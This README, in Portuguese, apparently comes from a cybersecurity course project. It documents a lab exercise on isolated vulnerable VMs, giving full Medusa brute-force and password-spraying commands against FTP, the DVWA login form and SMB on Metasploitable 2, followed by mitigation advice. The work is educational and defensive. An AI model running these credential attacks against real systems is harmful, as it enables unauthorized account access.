# Auditoria de Credenciais e Simulação de Força Bruta com Kali Linux e Medusa

Projeto prático desenvolvido como parte do desafio de Cibersegurança da **DIO**, com foco na simulação controlada de ataques de quebra de credenciais (**Brute Force** e **Password Spraying**) utilizando a ferramenta **Medusa** no **Kali Linux** contra ambientes intencionalmente vulneráveis (**Metasploitable 2** e **DVWA**), seguido pela análise de mitigação e endurecimento (*hardening*) de serviços.

> **Aviso Legal:** Todas as atividades descritas neste repositório foram executadas exclusivamente em ambiente virtualizado, isolado e controlado, com fins estritamente educacionais e de auditoria defensiva.

---

## 1. Arquitetura do Laboratório

O ambiente foi provisionado no **Oracle VirtualBox** utilizando uma rede isolada (**Host-Only Adapter**) para impedir qualquer tráfego externo durante os testes de intrusão.

| Máquina Virtual | Sistema Operacional | Papel no Cenário | Endereço IP (Exemplo) |
| :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux | Auditoria, reconhecimento e execução do Medusa | `192.168.56.101` |
| **Alvo** | Metasploitable 2 | Hospedagem de serviços legados (vsftpd, Samba) e aplicação web (DVWA) | `192.168.56.102` |

### Reconhecimento Inicial (Nmap)
Antes de iniciar os testes de autenticação, foi realizada a enumeração de portas e serviços ativos no alvo para confirmar a superfície de ataque:

```bash
nmap -sV -p 21,80,139,445 192.168.56.102
```

---

## 2. Cenários de Ataque Executados

### Cenário 1: Força Bruta no Serviço FTP (`vsftpd`)
O protocolo FTP transmite credenciais em texto claro e, na configuração padrão do Metasploitable 2, não possui bloqueio por tentativas falhas.

* **Módulo Medusa:** `ftp`
* **Comando executado:**
  ```bash
  medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4 -f
  ```
  * `-h`: Host alvo.
  * `-U` / `-P`: Listas de usuários e senhas.
  * `-M ftp`: Módulo correspondente ao protocolo FTP.
  * `-t 4`: Número de threads simultâneas.
  * `-f`: Interrompe a execução assim que a primeira credencial válida é encontrada (`msfadmin:msfadmin`).

* **Validação de Acesso:**
  ```bash
  ftp 192.168.56.102
  ```

---

### Cenário 2: Automação de Tentativas em Formulário Web (DVWA)
Para atacar a tela de login da **Damn Vulnerable Web Application (DVWA)** configurada em nível de segurança *Low*, foi utilizado o módulo `web-form` do Medusa, analisando previamente os parâmetros da requisição HTTP `POST` (`username`, `password`, `Login`) e a mensagem de erro retornada pelo servidor (`Login failed`).

* **Módulo Medusa:** `web-form`
* **Comando executado:**
  ```bash
  medusa -h 192.168.56.102 -u admin -P wordlists/passwords.txt -M web-form -m FORM:"dvwa/login.php" -m DENY-SIGNAL:"Login failed" -m FORM-DATA:"post?username=&password=&Login=Login"
  ```
  * `-u admin`: Usuário alvo conhecido da aplicação.
  * `-m FORM`: Caminho relativo do formulário de autenticação.
  * `-m DENY-SIGNAL`: String presente na resposta HTTP que indica falha na autenticação.
  * `-m FORM-DATA`: Estrutura dos campos enviados via método `POST`.

* **Resultado:** Identificação da credencial padrão `admin:password`.

---

### Cenário 3: Enumeração de Usuários e Password Spraying em SMB
Diferente da força bruta tradicional (que testa várias senhas contra um único usuário e gera bloqueios rapidamente), o **Password Spraying** testa uma única senha comum contra uma lista inteira de usuários enumerados.

1. **Enumeração de usuários válidos via SMB (`enum4linux`):**
   ```bash
   enum4linux -U 192.168.56.102
   ```

2. **Execução do Password Spraying com Medusa:**
   ```bash
   medusa -h 192.168.56.102 -U wordlists/users.txt -p msfadmin -M smbnt -t 2
   ```
   * `-p msfadmin`: Senha única testada horizontalmente contra todos os usuários da wordlist.
   * `-M smbnt`: Módulo para autenticação SMB/Windows/Samba.

* **Validação de Acesso (Listagem de compartilhamentos):**
  ```bash
  smbclient -L //192.168.56.102 -U msfadmin
  ```

---

## 3. Evidências

* `images/01-nmap-recon.png` — Descoberta das portas 21, 80, 139 e 445 abertas no alvo.
* `images/02-medusa-ftp.png` — Saída `[SUCCESS]` do Medusa para o serviço FTP.
* `images/03-medusa-dvwa.png` — Quebra de autenticação no formulário web do DVWA.
* `images/04-medusa-smb.png` — Enumeração SMB e resultado do Password Spraying.

---

## 4. Análise de Risco e Recomendações de Mitigação

A execução bem-sucedida dos três cenários evidencia falhas clássicas de configuração e controle de acesso. Para mitigar esses vetores em ambientes produtivos, recomendam-se as seguintes medidas:

### Controles Gerais de Identidade e Autenticação
* **Política de Senhas Fortes e MFA:** Exigir comprimento mínimo (12+ caracteres), complexidade e habilitar Autenticação Multifator (MFA) sempre que suportado, neutralizando o impacto de senhas vazadas ou adivinhadas.
* **Bloqueio de Conta e *Rate Limiting*:** Implementar bloqueio temporário (*Account Lockout*) após `N` tentativas inválidas e atraso progressivo (*throttling*) entre requisições de login.
* **Monitoramento e Detecção (SIEM/IPS):** Correlacionar logs de autenticação (como eventos `4625` no Windows ou `/var/log/auth.log` no Linux) para gerar alertas de múltiplas falhas provenientes do mesmo IP de origem (força bruta) ou distribuídas entre vários usuários em curto intervalo (password spraying), integrando com ferramentas como **Fail2Ban**, **Wazuh** ou **Suricata**.

### Mitigações Específicas por Serviço
* **FTP:** Substituir o FTP tradicional por **SFTP** (via SSH) ou **FTPS** (FTP sobre TLS), desabilitar o acesso `anonymous` e restringir usuários via *chroot*.
* **Aplicações Web (DVWA):** Implementar tokens **Anti-CSRF** dinâmicos a cada requisição de login (o que inviabiliza replays simples sem parser de sessão), adicionar **CAPTCHA** após falhas consecutivas e posicionar um **WAF (Web Application Firewall)** (como ModSecurity) para bloquear padrões automatizados de ataque.
* **SMB:** Desativar o protocolo legado **SMBv1**, exigir assinatura de pacotes (**SMB Signing**), restringir a enumeração anônima de usuários/compartilhamentos (`restrict anonymous = 2` no Samba) e segmentar o acesso às portas `139` e `445` via firewall apenas para sub-redes autorizadas.
